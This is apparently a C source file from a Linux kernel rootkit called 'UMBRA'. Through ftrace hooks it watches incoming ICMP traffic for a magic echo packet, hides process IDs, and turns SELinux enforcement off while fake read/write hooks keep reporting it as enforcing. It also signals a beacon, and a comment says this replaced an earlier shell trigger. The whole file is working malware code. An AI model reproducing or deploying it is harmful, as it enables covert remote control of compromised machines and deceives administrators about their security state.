#include "../include/ub_core.h"
#include "../include/relay.h"
#include "../include/veiled_pids.h"
#include "../include/beacon.h"
#include "../ftrace/hook_engine.h"

#define UB_RELAY_TOKEN 1337

static asmlinkage int (*ub_real_icmp_rcv)(struct sk_buff *);
static asmlinkage ssize_t (*ub_real_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
static asmlinkage ssize_t (*ub_real_sel_write_enforce)(struct file *, const char __user *, size_t, loff_t *);

struct relay_work {
    struct work_struct work;
};

static void *selinux_state_ptr = NULL;
static bool enforce_hook_active = false;
static int fake_enforce_value = 1;

notrace static asmlinkage ssize_t ub_hook_sel_write_enforce(
    struct file *filp,
    const char __user *buf,
    size_t count,
    loff_t *ppos)
{
    char kbuf[32];
    long val;
    int ret;

    if (!enforce_hook_active)
        return ub_real_sel_write_enforce(filp, buf, count, ppos);

    if (count > 0 && count < sizeof(kbuf)) {
        if (copy_from_user(kbuf, buf, count))
            return -EFAULT;

        kbuf[count] = '\0';

        ret = kstrtol(kbuf, 10, &val);
        if (ret == 0)
            fake_enforce_value = (int)val;
    }

    *ppos += count;
    return count;
}

notrace static asmlinkage ssize_t ub_hook_sel_read_enforce(
    struct file *filp,
    char __user *buf,
    size_t count,
    loff_t *ppos)
{
    char tmpbuf[12];
    ssize_t length;

    if (enforce_hook_active) {
        length = scnprintf(tmpbuf, sizeof(tmpbuf), "%d", fake_enforce_value);
        return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
    }

    return ub_real_sel_read_enforce(filp, buf, count, ppos);
}

notrace static int ub_bypass_selinux(void)
{
    struct {
        bool enforcing;
        bool checkreqprot;
        bool initialized;
    } *state;

    if (!selinux_state_ptr)
        return -1;

    state = selinux_state_ptr;

#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
    state->enforcing = 0;
    enforce_hook_active = true;
    fake_enforce_value = 1;
#endif

    return 0;
}

/* The magic ICMP packet now orders a fresh beacon generation instead of a shell. */
notrace static void ub_relay_trigger(struct work_struct *work)
{
    if (!ub_test_mode) {
        ub_veil_pid(current->pid);
        ub_veil_pid(current->tgid);
        ub_bypass_selinux();
    } else {
        pr_info("UMBRA test: ICMP relay trigger received\n");
    }

    ub_beacon_signal();

    kfree(container_of(work, struct relay_work, work));
}

notrace static asmlinkage int ub_hook_icmp_rcv(struct sk_buff *skb)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    u32 trigger_ip;
    struct relay_work *rw;

    if (!skb)
        goto out;

    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        goto out;

    icmph = icmp_hdr(skb);
    if (!icmph)
        goto out;

    if (!in4_pton(UB_RELAY_ADDR, -1, (u8 *)&trigger_ip, -1, NULL))
        goto out;

    if (iph->saddr == trigger_ip &&
        icmph->type == ICMP_ECHO &&
        ntohs(icmph->un.echo.sequence) == UB_RELAY_TOKEN) {

        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
        if (rw) {
            INIT_WORK(&rw->work, ub_relay_trigger);
            schedule_work(&rw->work);
        }
    }

out:
    return ub_real_icmp_rcv(skb);
}

static struct ftrace_hook ub_relay_hooks[] = {
    HOOK("icmp_rcv", ub_hook_icmp_rcv, &ub_real_icmp_rcv),
    HOOK("sel_read_enforce", ub_hook_sel_read_enforce, &ub_real_sel_read_enforce),
    HOOK("sel_write_enforce", ub_hook_sel_write_enforce, &ub_real_sel_write_enforce),
};

notrace int ub_relay_start(void)
{
    unsigned long addr;

    addr = (unsigned long)ub_resolve_symbol("selinux_state");
    if (addr)
        selinux_state_ptr = (void *)addr;

    return ub_fh_install_hooks(ub_relay_hooks, ARRAY_SIZE(ub_relay_hooks));
}

notrace void ub_relay_stop(void)
{
    ub_fh_remove_hooks(ub_relay_hooks, ARRAY_SIZE(ub_relay_hooks));
    enforce_hook_active = false;
    fake_enforce_value = 1;
    msleep(2000);
}
